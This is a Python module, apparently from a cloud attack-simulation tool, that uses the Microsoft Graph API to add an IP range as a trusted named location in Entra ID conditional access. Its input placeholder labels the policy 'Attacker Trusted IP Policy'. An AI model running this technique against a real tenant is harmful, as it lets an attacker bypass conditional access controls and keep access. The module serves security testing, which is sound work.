'''
Module Name : Modify_Trusted_IP
Module Description: Modify named locations to add trusted IP in conditional access policy. Permission required: Policy.Read.All and Policy.ReadWrite.ConditionalAccess
Reference : https://learn.microsoft.com/en-us/graph/api/conditionalaccessroot-post-namedlocations?view=graph-rest-1.0&tabs=http
'''
from core.GraphFunctions import graph_post_request

def TechniqueMain(trusted_policy_name, ip_addr):
    
    # input validation
    if trusted_policy_name in [None, ""]:
        return False, {"Error" : "Invalid Technique Input"}, None
    if ip_addr in [None, ""]:
        return False, {"Error" : "Invalid Technique Input"}, None
    
    endpoint_url = "https://graph.microsoft.com/v1.0/identity/conditionalAccess/namedLocations"

    data = {
        "@odata.type": "#microsoft.graph.ipNamedLocation",
        "displayName": trusted_policy_name,
        "isTrusted": 'true',
        "ipRanges": [
            {
                "@odata.type": "#microsoft.graph.iPv4CidrRange",
                "cidrAddress": ip_addr
            }
        ]
    }

    try:
        raw_response = graph_post_request(url = endpoint_url, data = data)

        # create trusted IP policy operation successfull
        if 200 <= raw_response.status_code < 300:
            # parse raw response => pretty response
            try:
                # create pretty response
                pretty_response = {}

                pretty_response["Success"] = {
                    'Message' : "Trusted IP policy created",
                    'Policy Name' : raw_response.json().get('displayName', 'N/A'),
                    'Policy Id' : raw_response.json().get('id', 'N/A'),
                    'IP' : ip_addr,
                    'Is Trusted' : raw_response.json().get('isTrusted', 'N/A')
                }
                return True, raw_response, pretty_response
            except:
                # return only raw response if pretty response fails
                return True, raw_response, None
        
        # create trusted IP policy operation failed
        else:
            return False, {"Error" : {"Response Status" : raw_response.status_code, "Code" : raw_response.json().get('error').get('code', 'N/A'), "Message" : raw_response.json().get('error').get('message', 'N/A')}}, None
    
    except Exception as e:
        return False, {"Error" : e}, None

def TechniqueInputSrc() -> list:
    '''Returns the input fields required as parameters for the technique execution'''
    return [
        {"title" : "New Policy Name", "id" : "mod-trstd-ip-config-policy-name-text-input", "type" : "text", "placeholder" : "Attacker Trusted IP Policy", "element_type" : "dcc.Input"},
        {"title" : "IP Address with subnet", "id" : "mod-trstd-ip-config-ip-text-input", "type" : "text", "placeholder" : "1.1.1.1/22", "element_type" : "dcc.Input"}
    ]